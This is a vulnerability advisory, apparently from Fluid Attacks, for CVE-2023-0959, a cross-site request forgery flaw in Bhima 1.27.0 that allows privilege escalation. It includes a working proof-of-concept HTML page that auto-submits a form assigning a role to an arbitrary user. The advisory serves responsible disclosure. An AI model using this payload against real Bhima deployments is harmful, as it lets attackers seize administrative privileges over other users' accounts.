---
slug: advisories/calamaro/
title: Bhima 1.27.0 - Privilege Escalation via CSRF
authors: Carlos Bello
writer: cbello
codename: calamaro
product: Bhima 1.27.0 - Privilege Escalation via CSRF
date: 2023-02-27 12:00 COT
cveid: CVE-2023-0959
severity: 8.0
description: Bhima 1.27.0      -      Privilege Escalation via CSRF
keywords: Fluid Attacks, Security, Vulnerabilities, CSRF, Bhima, Privilege Escalation
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | Bhima 1.27.0 - Privilege Escalation via CSRF                       |
| **Code name**         | [Calamaro](https://en.wikipedia.org/wiki/Andr%C3%A9s_Calamaro)     |
| **Product**           | Bhima                                                              |
| **Affected versions** | Version 1.27.0                                                     |
| **State**             | Public                                                             |
| **Release date**      | 2023-02-27                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Cross-site request forgery                                                                                                  |
| **Rule**              | [007. Cross-site request forgery](https://docs.fluidattacks.com/criteria/vulnerabilities/007)                               |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H                                                                                |
| **CVSSv3 Base Score** | 8.0                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-0959](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0959)                                               |

## Description

Bhima version 1.27.0 allows a remote attacker to update the privileges
of any account registered in the application via a malicious link sent
to an administrator. This is possible because the application is vulnerable
to CSRF.

## Vulnerability

This vulnerability occurs because the application is vulnerable to CSRF.
In this way we can persuade an administrator to elevate the privileges
of an arbitrary account.

## Exploitation

### Exploit.html

```html
<!DOCTYPE html>
<html>
  <body>
    <form action="http://localhost:8082/roles/assignTouser" method="POST">
      <input type="hidden" name="user_id" value="6" />
      <input type="hidden" name="role_uuids" value="5B7DD0D692734955A703126FBD504B61" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Evidence of exploitation

![Priv-Escalation-csrf](https://user-images.githubusercontent.com/51862990/220748412-3b636ab7-8c8b-4c9b-b715-8d4812cac2da.gif)

## Our security policy

We have reserved the ID CVE-2023-0959 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Bhima 1.27.0

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/IMA-WorldHealth/bhima/>

## Timeline

<time-lapse
  discovered="2023-02-22"
  contacted="2023-02-22"
  replied="2023-02-22"
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
